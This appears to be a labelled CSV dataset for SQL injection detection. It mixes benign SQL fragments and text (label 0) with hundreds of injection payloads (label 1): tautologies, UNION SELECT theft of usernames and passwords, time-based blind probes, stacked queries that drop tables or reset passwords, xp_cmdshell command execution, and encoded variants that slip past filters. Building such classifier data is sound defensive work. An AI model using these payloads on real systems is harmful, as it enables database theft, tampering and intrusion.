Sentence,Label
11' OR '1' = '1/* OR 1=1161,1
"1'%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--600/* OR 1=1",1
"useradmin"" OR 1=1--#/*606 AND 1=1 AND 1=1",1
2' AND SLEEP(5)--761/*,1
1' OR '1' = '1-- AND 1=1#,1
"1'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1 AND 1=1 OR 1=1--",1
SELECT support ( s )  FROM swung FULL OUTER JOIN,0
ADMIN'/*172620849#,1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--#912",1
"1"" UNION SELECT username,password FROM users--523",1
"1admin"" OR 1=1-- AND 1=1666",1
"' UNION SELECT NULL,NULL,NULL--/*/* OR 1=1213",1
SELECT AVG ( aid ) FROM corner,0
' or 2=2--/*/*,1
';+EXEC+xp_cmdshell('dir')-- AND 1=1 AND 1=1,1
carlos tomas romero 130,0
"11' UNION SELECT NULL,table_name FROM information_schema.tables--/*--/*481740",1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1497718--",1
SELECT * FROM gentle WHERE lose = 'cut' LIMIT 3,0
"1'%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables--13",1
bernab,0
"user' UNION SELECT username,password FROM users----506758",1
SELECT TOP 3 * FROM made WHERE lesson = 'frame',0
"1';%09INSERT%09INTO%09users%09VALUES('hacked','pass')--252",1
"admin"" UNION ALL SELECT NULL-- AND 1=1474",1
7016,0
9.20248E+015,0
5632,0
"""%20or%201=1#449",1
"1'/**/UNION/**/SELECT/**/NULL,table_name/**/FROM/**/information_schema.tables--197",1
"' UNION SELECT username,password FROM users-- OR 1=1366",1
SELECT * FROM pale,0
"   SELECT cause,may,yesterday,cookies,fill     (  (  upper JOIN common ON tide.facing =  brain.object )   INNER JOIN blowON Orders.notice =  inch.sangID ) ",0
test' OR '1'='1 AND 1=1--775,1
SELECT TOP 3 * FROM attack WHERE doctor = 'coat' SELECT * FROM smaller,0
1' OR 'a'='a544#80 AND 1=161,1
11' OR 1 = 1/*--199,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1189 OR 1=1 AND 1=1/*390",1
"admin"") OR (""1""=""1# OR 1=1601 AND 1=1815 OR 1=1 OR 1=1 AND 1=1",1
""" OR 1=1#--/*",1
SELECT * FROM butter WHERE within BETWEEN not09/01/1996border AND birds15/31/1996vertical,0
' or 2=2/* AND 1=1/* AND 1=1169,1
"admin' UNION SELECT 1,2,3--#343841684443",1
"1"" OR 1=1/*# AND 1=1",1
admin' UNION ALL SELECT NULL-- AND 1=111/*765,1
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1131496 AND 1=1 AND 1=1",1
1' OR 1=1/*# OR 1=1/*506,1
"user"" UNION SELECT NULL,NULL--/*/*",1
admin%27%20OR%20%271%27%3D%27120 AND 1=140 AND 1=1 AND 1=1 OR 1=1 OR 1=1377,1
"  UPDATE daughter SET doubt =  'door', City =  'told' WHERE factor =  outline",0
user' UNION ALL SELECT NULL--/*/*#,1
"admin"" OR ""1""=""1"" /*/*",1
user1' OR '1' = '1 OR 1=1,1
SELECT AVG ( split ) FROM try SELECT SUM ( knife ) ,0
SELECT base ( s )  FROM is UNION ALL,0
"admin' UNION SELECT NULL,NULL--8975141504",1
""" or 1=1--73843",1
'/**/OR/**/1=1-- OR 1=1 AND 1=1 AND 1=1 OR 1=1,1
"testadmin"" OR ""1""=""1 AND 1=1 OR 1=1 OR 1=1854",1
"1""%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--# AND 1=1 AND 1=1",1
"admin"" OR 1=1#/*32775687171 OR 1=1 AND 1=1",1
"   SELECT road, favorite, badFROM victory WHERE cause  IS NOT NULL",0
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--# AND 1=168/*690",1
"  SELECT street AS corner, business AS [beauty]  FROM climb",0
%27%20UNION%20SELECT%20NULL-- OR 1=1,1
"c/ bailen 8,",0
'%20or%201=1#86,1
""" OR ""1""=""1"" /*### OR 1=1",1
'%09UNION%09ALL%09SELECT%09NULL--/* OR 1=1--,1
"user"") OR 1=1-- AND 1=1325 AND 1=167# AND 1=1#",1
SELECT TOP 50 PERCENT * FROM wealth,0
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1812 AND 1=1853657917",1
""" UNION SELECT username,password FROM users-- OR 1=1-- AND 1=1 AND 1=1",1
' OR '2'='2 AND 1=1 AND 1=1440,1
'/**/OR/**/1=1-- OR 1=1876-- AND 1=1,1
SELECT * FROM suit  WHERE brush = travel,0
""" OR ""1""=""1 AND 1=1 OR 1=1 AND 1=1",1
ADMIN'/* AND 1=1911 AND 1=1281,1
"  UPDATE dried SET swim =  'north', City =  'huge' WHERE flight =  saved",0
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--# AND 1=1# OR 1=1468",1
%2527%2529%2520OR%2520%2528%25271%2527%253D%25271--# OR 1=123,1
SELECT COUNT ( moonID ) FROM shoulder,0
"test"" UNION SELECT 1,2,3--/*10 AND 1=1 AND 1=1/*917",1
1'%09AND%09pg_sleep(5)--860 OR 1=1258190421#,1
"1""----101----",1
%27%20or%201%3D1%23759/*,1
"admin' UNION SELECT NULL,NULL--897985",1
"1""+OR+1+=+1351888354",1
test' UNION SELECT NULL----#261--758,1
SELECT * FROM far WHERE possibly = 'world',0
%2527%253B%2520SELECT%2520SLEEP%25285%2529-- AND 1=1845,1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--625#188",1
"user"") OR 1=1-- AND 1=1882350307# OR 1=1941",1
"admin"" UNION SELECT 1,2,3-- AND 1=1957725837 AND 1=1",1
47209,0
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1 OR 1=1370419",1
"calle sierra del quintanar, 199 9-b",0
1'%09AND%09pg_sleep(5)--860513302,1
"""+UNION+SELECT+NULL--608168917",1
';%09EXEC%09xp_cmdshell('dir')---- AND 1=1887461,1
"  SELECT making AS hang, class AS [found]  FROM claws",0
SELECT enemy ( s )  FROM five SELECT wrong FROM wind,0
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1----773865711",1
"1"";+INSERT+INTO+users+VALUES(""hacked"",""pass"")--517 OR 1=1",1
admin%27%23 AND 1=1--310,1
""" AND extractvalue(1,concat(0x7e,version()))-- OR 1=1278583",1
'+OR+1=1--156/*437547,1
"admin""%20OR%20""1""=""1",1
useradmin' OR 1=1----925,1
SELECT * FROM should WHERE spell BETWEEN '1996-07-01' AND '1996-07-31',0
"admin""%20OR%20""1""=""1 AND 1=1987",1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))---- AND 1=1",1
SELECT quietly FROM where UNION ALL SELECT short FROM went ORDER BY caught,0
SELECT whole ( s )  FROM dry UNION ALL,0
10x27 AND pg_sleep(5)--#,1
%27%20or%201%3D1/%2A,1
SELECT * FROM station WHERE invented = 'worry'  AND City = 'meant',0
user' OR 1=1/*/*904,1
craggs,0
SELECT DISTINCT frame FROM write,0
nassiet.birkin@cienciapolicial.gl,0
"1' UNION SELECT 1,2,3-- AND 1=1952540#73",1
retasac5n,0
' or 2=2/*# OR 1=1405,1
"test' UNION SELECT username,password FROM users-- AND 1=1 OR 1=1",1
"1"" UNION SELECT 1,2,3-- AND 1=1--",1
1'%09AND%09pg_sleep(5)--860 OR 1=125816#690,1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1812371/*378",1
SELECT * FROM equipment  WHERE horse = eaten,0
testadmin' OR '1'='1 AND 1=1613186499211,1
tajamar,0
"  SELECT climbID AS ID, think AS weight FROM talk",0
'%20or%201=1--969 OR 1=1/*608,1
1' OR '1' = '1 AND 1=1566 OR 1=1 OR 1=1#458/*/*,1
SELECT * FROM classroom WHERE    NOT lonely = 'work',0
SELECT volume ( s ) FROM girl INNER JOIN,0
FROM  ( SELECT DISTINCT choice FROM event ) ,0
1' OR '1'='1/* AND 1=1 OR 1=1/*317,1
"useradmin"" OR ""1""=""1-- OR 1=1600341",1
"admin"" UNION SELECT NULL,NULL,NULL--/*517 AND 1=1594 OR 1=1317",1
test1' OR '1' = '1/*#63257#,1
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29----# AND 1=1/*,1
boes@cumbareback.kz,0
admin') OR 1=1--# AND 1=1580/*,1
SELECT COUNT ( DISTINCT experience )  FROM talk,0
8652160000000000,0
"99"" OR 99 = 99 OR 1=1#/*5569",1
';+EXEC+xp_cmdshell('dir')-- AND 1=1 AND 1=1473,1
"1"" UNION SELECT NULL----159667----",1
' OR '2'='2/*699,1
"admin' UNION SELECT 1,2,3----811-- OR 1=1--799",1
"admin"" UNION SELECT NULL,NULL,NULL--/*517 AND 1=1594",1
%2527%2520OR%25201%253D1/%252A AND 1=1,1
"admin' UNION SELECT NULL,NULL--897514154 OR 1=1912816",1
' or 2=2/* AND 1=1/* AND 1=1514,1
presencio,0
""";%20EXEC%20xp_cmdshell(""dir"")--#",1
1' OR '1'='1' --#57 OR 1=1 OR 1=1,1
"sierra bermeja s/n,",0
"test' UNION SELECT 1,2,3-- AND 1=1512 AND 1=1760211",1
SELECT option_value FROM wp_options WHERE option_name  =  '_options_linkedin_url' LIMIT 1,0
SELECT TOP 3 * FROM certainly,0
""" UNION SELECT NULL--/*",1
admin' UNION ALL SELECT NULL-- AND 1=162347,1
1'%09OR%09'1'%09=%09'1998863,1
';+EXEC+xp_cmdshell('dir')-- AND 1=1--247968,1
testadmin' OR '1'='1 AND 1=1613/*,1
SELECT * FROM combination WHERE former = 'lovely' LIMIT 3,0
"test"" UNION SELECT 1,2,3-- AND 1=1512 AND 1=1#793#",1
"1""+UNION+SELECT+NULL,table_name+FROM+information_schema.tables-- OR 1=1658339",1
1'%09AND%09pg_sleep(5)--860 OR 1=12581646,1
'/**/OR/**/1=1-- OR 1=1 AND 1=1636,1
cadek,0
"1""; INSERT INTO users VALUES(""hacked"",""pass"")--739#",1
"test' UNION SELECT NULL,NULL--/*978332",1
ADMIN'/*826/*/*,1
1' OR '1'='1 OR 1=1257--57050234,1
99' OR 99 = 99 OR 1=1# AND 1=1,1
4611890000000000,0
testadmin' OR '1'='1 AND 1=1 OR 1=1 OR 1=1/* AND 1=1/*--931,1
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29---- AND 1=1,1
SELECT * FROM such WHERE brought IN  ( SELECT brief FROM certain ) ,0
"admin' UNION SELECT NULL,NULL,NULL---- AND 1=1982938",1
useradmin' OR 1=1--# AND 1=1 OR 1=1,1
user1' OR '1' = '1--,1
re9a3io,0
1' OR '1' = '1 AND 1=1 AND 1=1/*993674,1
floriano,0
' or 2=2/*# OR 1=1 AND 1=1,1
"admin"" UNION SELECT NULL,NULL,NULL---- AND 1=1226",1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1812 AND 1=1853657653",1
' or 2=2----973431,1
casarabonela,0
"test' UNION SELECT 1,2,3----229",1
"99'; INSERT INTO users VALUES('hacked','pass')--372816#--252696828",1
natal,0
' OR '1'='1 AND 1=1 OR 1=1--726,1
91436910l,0
morlanes funosa,0
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1--247914",1
admin') OR ('1'='1# OR 1=1,1
"test' UNION SELECT 1,2,3--/*10 AND 1=1 OR 1=1",1
""" UNION SELECT username,password FROM users-- AND 1=1",1
alvaro-pagano@hiperpapel.an,0
4978850000000000,0
DELETE FROM dangerous WHERE strike = 'picture',0
test1' OR '1' = '1/*#63257869,1
moskuna@sitcpla.ye,0
"test' UNION SELECT username,password FROM users--/*836##",1
'%20or%201=1# AND 1=1/*636,1
"admin1"" OR ""1"" = ""1--/*737487",1
SELECT * FROM hit WHERE brick NOT LIKE '[similar]%',0
f8av2,0
'+OR+1=1--156/*778,1
"admin1"" OR ""1"" = ""1# AND 1=1#785489831--/*515",1
3953,0
"1'%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables--408298 OR 1=1",1
')+OR+('1'='1 AND 1=1 OR 1=1--361,1
"   SELECT action, stairs, cool FROM noun WHERE arm  IS NULL",0
user' OR '1'='1' -- AND 1=1/* OR 1=1,1
'; UPDATE USERS SET PASSWORD='HACKED'----,1
testadmin' OR '1'='1/*622/*,1
"""+UNION+SELECT+NULL--608690 OR 1=1",1
"testadmin"" OR ""1""=""1 AND 1=1613186#218#",1
SELECT * FROM tears FETCH FIRST 50 PERCENT ROWS ONLY,0
"11"" OR ""1"" = ""1/* OR 1=1",1
admin0x27/*467468 OR 1=1999#,1
"' union select null,null,null--860 AND 1=1--",1
aineln,0
""")+OR+(""1""=""1-- AND 1=1 AND 1=1 OR 1=1--",1
SELECT COUNT ( simply )  FROM standard,0
%2527%2520or%25201%253D1/%252A523138 AND 1=1,1
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1799--",1
1052,0
' OR '2'='213/*10145,1
"admin"") OR (""1""=""1# OR 1=1601 AND 1=1/*",1
"1'/**/AND/**/BENCHMARK(5000000,MD5('A'))--#--",1
" SELECT * FROM tales ORDER BY how ASC, break DESC",0
"1"" UNION SELECT NULL,NULL----401",1
' or 2=2----973832,1
SELECT tool FROM coffee,0
mallat paiva,0
shorwan,0
"pl. san anton, 102",0
';%20SELECT%20SLEEP(5)--,1
""" or 1=1----685",1
') OR ('1'='1/* OR 1=1/* OR 1=149121,1
1206130000000000,0
"user"") OR (""1""=""1--167387857",1
SELECT AVG ( office ) FROM among,0
ausent+e,0
"admin' UNION SELECT NULL,NULL--#122619 AND 1=1",1
"""/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--#-- OR 1=1",1
SELECT week ( s )  FROM outside SELECT pot FROM during,0
"user"" OR 1=1/*/* AND 1=1/*/*352",1
'/**/OR/**/'1'='1'/**/--282# OR 1=1,1
SELECT * FROM likely WHERE equally = 'is',0
admin'#/*873,1
"1'%20AND%20BENCHMARK(5000000,MD5('A'))-- OR 1=1",1
"   SELECT opportunity, ear, potFROM fat WHERE four  IS NOT NULL",0
' or 2=2/*367 OR 1=1 OR 1=1#,1
SELECT * FROM grain WHERE positive = 'matter'  OR remember = 'warm',0
"  UPDATE do SET action =  'come', City =  'thought' WHERE grandmother =  plain",0
ADMIN'/*172620279668 AND 1=1,1
"1""+OR+1+=+1/* OR 1=1",1
6905240000000000,0
admin1' OR '1' = '1/*,1
'%20or%201=1# AND 1=1368--381#,1
empeine,0
test' OR 1=1##933102# OR 1=1,1
SELECT football ( s )  FROM lovely LEFT JOIN,0
"test' UNION SELECT 1,2,3--/*10 AND 1=1--",1
SELECT * FROM of  WHERE unknown = shout,0
"1"" OR ""1"" = ""1-- OR 1=1#272--",1
'; WAITFOR DELAY '0:0:5'--/*#,1
SELECT * FROM call WHERE behind = 'gulf'  OR refer = 'hot',0
'/**/OR/**/1=1-- OR 1=1 AND 1=1 OR 1=1 OR 1=1348,1
1'%09OR%09'1'%09=%09'1998/* OR 1=1218,1
' or 1=1--73/*,1
""")+OR+(""1""=""1 AND 1=1 OR 1=1--171",1
user' OR '1'='1#315--159,1
admin1' OR '1' = '1--279# AND 1=1 OR 1=1#,1
'+OR+1=1--156/*437/*,1
1' OR '1' = '1 AND 1=1 AND 1=1/*993662,1
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1878 AND 1=1",1
"admin"" UNION ALL SELECT NULL--",1
user') OR 1=1-- AND 1=1882350307#--273,1
"""%20or%201=1/*835 OR 1=174",1
"admin' UNION SELECT NULL,NULL,NULL--/*#444951/*",1
admin' OR 1=1#/*471125,1
'+or+1=1# OR 1=1,1
 UPDATE basic SET proper = 'bag'WHERE high = 'did',0
';+EXEC+xp_cmdshell('dir')-- AND 1=1 AND 1=1591,1
galce,0
"1"" OR ""a""=""a AND 1=1--376517738",1
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1878 OR 1=1439",1
"test' UNION SELECT 1,2,3-- AND 1=1512 AND 1=1309718542",1
benigni@viajesdacapalla.pa,0
"admin"" UNION SELECT 1,2,3-- AND 1=1957725244",1
SELECT * FROM particularly WHERE unless BETWEEN 'heavy' AND 'push',0
admin'%20OR%20'1'='1 AND 1=1987 OR 1=1/*,1
"""%20or%201=1#428/*893",1
SELECT * FROM cream WHERE oxygen = 'person' LIMIT 3,0
SELECT * FROM correctly WHERE serve NOT LIKE 'inside%',0
lehar,0
user') OR 1=1-- AND 1=1325 AND 1=167# AND 1=1,1
SELECT * FROM attention WHERE famous LIKE '%floor%',0
admin%27%20OR%20%271%27%3D%27120 AND 1=1#--/*,1
'/**/OR/**/'1'='1'/**//*589 OR 1=1 AND 1=1501# OR 1=1,1
user') OR 1=1-- AND 1=1325 AND 1=167#858,1
"user"") OR (""1""=""1 AND 1=162646895672",1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1497352",1
user' OR 1=1/*/* AND 1=1/*-- OR 1=1906,1
SELECT * FROM complex WHERE one LIKE '%cut%',0
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138/*-- AND 1=1901",1
SELECT TOP 3 * FROM yellow,0
"admin""/**/OR/**/1=1-- OR 1=1 OR 1=1756/*-- AND 1=1 AND 1=1--495",1
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1799350977 AND 1=1/*",1
9ot87ico,0
"test"" UNION ALL SELECT NULL-- OR 1=1316",1
admin' OR '99'='99 OR 1=1809 AND 1=1,1
SELECT COUNT ( DISTINCT theory )  FROM stairs,0
SELECT * FROM manufacturing WHERE inside BETWEEN studied09/01/1996kept AND entirely15/31/1996damage,0
';%20EXEC%20xp_cmdshell('dir')--591 AND 1=1108/*321 OR 1=1272,1
user') OR ('1'='1 AND 1=1 AND 1=1 OR 1=1840/*,1
"1'; INSERT INTO users VALUES('hacked','pass')--739-- OR 1=1518792",1
' OR '1'='1#474225902,1
';%09EXEC%09xp_cmdshell('dir')----##/*,1
" SELECT * FROM fourth ORDER BY dust ASC, talk DESC",0
"1'+UNION+SELECT+NULL,column_name+FROM+information_schema.columns--566880",1
admin' UNION SELECT NULL-- AND 1=1#645/*735909--#,1
';%20EXEC%20xp_cmdshell('dir')--591 AND 1=1108/* OR 1=1# AND 1=1,1
SELECT pain FROM stepped,0
"1"" OR ""1"" = ""1 AND 1=1## OR 1=1",1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--625 AND 1=1",1
' OR 1=1#---- OR 1=1844709,1
"""%20or%201=1/*835257/* OR 1=1 AND 1=1/*",1
potroso,0
tracisto arroyave,0
"admin"" UNION SELECT NULL,NULL,NULL---- AND 1=198256541312",1
chuanhsi,0
SELECT * FROM shoe WHERE Price NOT BETWEEN 10 AND 20,0
1' AND pg_sleep(5)-- AND 1=1#,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1189 OR 1=1--",1
5ecom058a?8a,0
"test' UNION SELECT 1,2,3-- AND 1=1512 AND 1=1309718 OR 1=1",1
"1"" UNION SELECT NULL,NULL------611-- OR 1=1-- OR 1=1",1
"1""%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--# AND 1=1",1
seymour@evelin.gn,0
"user' UNION SELECT NULL,NULL--# OR 1=1#266633",1
test1' OR '1' = '1/*#63257751 OR 1=1,1
ezio,0
SELECT * FROM buy WHERE vapor  BETWEEN 10 AND 20,0
"1""%20AND%20pg_sleep(5)--533872287498",1
user' OR 1=1/*/* AND 1=1/*10,1
cijuela,0
1' OR '1'='1' --/*612 AND 1=1#988291,1
'%20OR%20'1'='1'%20/*915324,1
SELECT AVG ( later )  FROM gray  SELECT SUM ( salmon ) ,0
""" OR ""2""=""2 AND 1=1 AND 1=1--173445",1
SELECT doing ( s )  FROM largest,0
"admin' UNION SELECT NULL,NULL--897514154 OR 1=1 OR 1=1833 OR 1=1",1
SELECT Count ( * )  AS known,0
" SELECT * FROM brave ORDER BY detail ASC, wish DESC",0
"  SELECT after,instance FROM cheese WHERE wise = 'wall' UNION SELECT consonant, cave FROM plane",0
1%27%3B%20DROP%20TABLE%20users--/*586 AND 1=1 OR 1=1348# OR 1=1,1
SELECT TOP 50 PERCENT * FROM pony SELECT * FROM women FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM huge,0
"   SELECT identity, applied, laidFROM strip WHERE mathematics  IS NOT NULL",0
ADMIN'/*172620/*585,1
SELECT account FROM come UNION ALL SELECT expect FROM like ORDER BY barn,0
12527,0
SELECT TOP 3 * FROM simple WHERE especially = 'frame' SELECT * FROM kind,0
"  SELECT kill AS football, supply AS [drove]  FROM saved",0
"user"" UNION SELECT NULL,NULL,NULL--805--",1
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1799350904",1
%2527%2520OR%2520%25271%2527%253D%25271,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311189",1
0x27) OR 1=1--# AND 1=1--750,1
test' UNION SELECT NULL----#110858,1
SELECT captain ( s )  FROM blanket SELECT factory ( s ) ,0
"user"" UNION SELECT NULL--/*583--#",1
') OR ('1'='1/* OR 1=1--249,1
""" OR ""2""=""2 AND 1=1 AND 1=1--17366261",1
pandora,0
"admin1"" OR ""1"" = ""1#--",1
"c/ san miguel, 111 6?f",0
SELECT DISTINCT discover FROM author,0
'%09OR%09'1'='1/*293,1
0x27; EXEC xp_cmdshell(0x27dir0x27)--91,1
'+OR+1=1----966--,1
SELECT COUNT ( jarID ) FROM teeth,0
"admin' UNION SELECT NULL,NULL--#122619900",1
SELECT * FROM general WHERE easy  BETWEEN 10 AND 20,0
SELECT * FROM individual WHERE sugar BETWEEN '1996-07-01' AND '1996-07-31',0
novalbos illarraga,0
'%09OR%091=1--#738517,1
"1"" UNION SELECT NULL,NULL------611--213#",1
"1""/**/UNION/**/SELECT/**/NULL,table_name/**/FROM/**/information_schema.tables--",1
"admin' UNION SELECT username,password FROM users-- AND 1=1 AND 1=1",1
SELECT * FROM recently WHERE coat = 'excellent' LIMIT 3,0
SELECT * FROM learn FETCH FIRST 3 ROWS ONLY,0
"' union select null,null,null--# AND 1=1--535943",1
test' OR 1=1##/* OR 1=1-- OR 1=1,1
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1799350804",1
villamediana de iregua,0
"INSERT INTO became  ( dark, complete, essential )  VALUES  ( 'freedom', 'wire', 'produce' )  ",0
"99'; INSERT INTO users VALUES('hacked','pass')--37281667561575",1
SELECT * FROM railroad WHERE city = 'pencil' FETCH FIRST 3 ROWS ONLY,0
"admin"" UNION SELECT NULL,NULL,NULL--/*517 AND 1=1594--913279",1
SELECT * FROM brain WHERE forty  BETWEEN 10 AND 20,0
"admin1"" OR ""1"" = ""1# OR 1=1/*67721470395",1
' OR '2'='213 AND 1=1/*66863,1
"  SELECT * FROM glass WHERE topic NOT IN  ( 'tell', 'mouth', 'typical' )  ",0
' AND 2=CAST((SELECT @@version) AS int)--#373 OR 1=1380--,1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--#423561",1
' OR 1=1#----#18439,1
"useradmin"" OR ""1""=""1-- OR 1=1125531#",1
89388462c,0
15495714q,0
"admin1"" UNION SELECT NULL,table_name FROM information_schema.tables--813 OR 1=1#/*",1
kri!sti,0
"1"";%20WAITFOR%20DELAY%20""00:00:05""--427",1
"user' UNION SELECT username,password FROM users------245#394",1
'%09or%091=1# AND 1=1 OR 1=1 AND 1=1,1
"""+OR+1=1--156/*437",1
SELECT AVG ( lips ) FROM simply,0
' OR 'a'='a8398922 OR 1=1,1
SELECT AVG ( rubber )  FROM prize  SELECT SUM ( court ) ,0
'; update users set password='hacked'-- AND 1=1770,1
"calle padre payan 127,",0
"1""+UNION+SELECT+NULL,table_name+FROM+information_schema.tables-- AND 1=1 AND 1=1#510",1
"   SELECT Employees.plates, COUNT ( Orders.burstID )  AS patternFROM    ( OrdersINNER JOIN safe ON Orders.youID  =  Employees.callID ) ",0
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138/*-- AND 1=1575",1
"""/**/OR/**/1=1-- OR 1=1/*857890754",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 9774 )  ORDER BY meta_id ASC",0
"  SELECT buy,them FROM changing WHERE difference = 'major' UNION SELECT dead, tightly FROM hang",0
admin' OR '1'='1' --802,1
distar,0
SELECT AVG ( Price ) FROM battle,0
1'%20AND%20pg_sleep(5)--533--,1
%27%20OR%201%3D1%2F%2A/*/*,1
3618060000000000,0
ADMIN'/*172620 OR 1=1116471,1
"test"" UNION SELECT NULL,NULL--/* AND 1=1/*142",1
'/**/or/**/1=1/*135540962777,1
SELECT * FROM goose WHERE mistake BETWEEN judge09/01/1996twelve AND within15/31/1996plain,0
1' OR '1'='1 OR 1=1257 AND 1=1,1
admin' OR 1=1/*#178,1
""" OR 99=99##608",1
"admin1"" OR ""1"" = ""1--/*737#267",1
c/ costa i llobera 83,0
SELECT COUNT ( saddle ) FROM organization,0
' OR 'a'='a83989127 OR 1=1,1
"""%20or%201=1/*696#",1
"  SELECT Orders.sayrID, Employees.rose, Employees.steep FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.foxID ORDER BY Orders.climateID",0
admin' UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1/*111,1
"' AND extractvalue(1,concat(0x7e,version()))--589",1
SELECT smile,0
"99'; INSERT INTO users VALUES('hacked','pass')--372816#47128",1
1' OR '1'='1' --/*#888,1
admin' OR 1=1/*#514 AND 1=1,1
' AND 2=CAST((SELECT @@version) AS int)--#373--22,1
SELECT * FROM situation WHERE additional = 'eye'  OR slope = 'horn',0
admin' UNION ALL SELECT NULL--24/* OR 1=1110,1
SELECT * FROM  ( SELECT someone FROM nor ) ,0
test' OR '1'='1' --714631660,1
brenn,0
admin1' OR '1' = '1--/*/*814-- OR 1=1978,1
"test' UNION SELECT username,password FROM users-- AND 1=1--",1
"admin""/**/OR/**/1=1-- OR 1=1823",1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=1/*/*961",1
1'----101920,1
SELECT MIN ( buy )  AS forty FROM whom,0
"""%20or%201=1/*83525738383159988",1
admin' OR '1'='1' /* AND 1=1452#439,1
"99"" OR 99 = 99 OR 1=1#/*307374",1
SELECT AVG ( feel ) FROM its SELECT SUM ( city ) ,0
espineta astorquiza,0
user') OR ('1'='1#661,1
10x27 AND pg_sleep(5)--#/* OR 1=1,1
"1' UNION SELECT NULL,NULL---- OR 1=1 AND 1=1",1
"1"" UNION SELECT NULL,NULL------611--306493#--",1
'; UPDATE USERS SET PASSWORD='HACKED'--69164 OR 1=1367,1
SELECT * FROM fur WHERE habit BETWEEN 'grown' AND 'reason',0
"""/**/OR/**/""1""=""1""/**/--413806",1
SELECT * FROM whole WHERE mouth = 'trap',0
98918059g,0
SELECT * FROM cold WHERE ask BETWEEN 'wolf' AND 'numeral',0
"admin' UNION SELECT username,password FROM users-- AND 1=1/* AND 1=1#",1
"1"" UNION SELECT NULL----395/* AND 1=1228931162",1
SELECT slipped FROM drove UNION SELECT alone FROM name ORDER BY planning,0
SELECT * FROM save WHERE    NOT hidden = 'root',0
1'%20OR%20'1'%20=%20'1918483,1
SELECT AVG ( farm )  FROM stone  SELECT SUM ( instant ) ,0
"user"" UNION SELECT NULL--/*58370329/*242",1
2' AND SLEEP(5)----232856,1
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1878##990",1
ADMIN'/*172620 OR 1=1 AND 1=1,1
llub,0
11800455y,0
6424,0
oseja,0
""";+EXEC+xp_cmdshell(""dir"")--## AND 1=1248",1
admin' UNION SELECT NULL----247,1
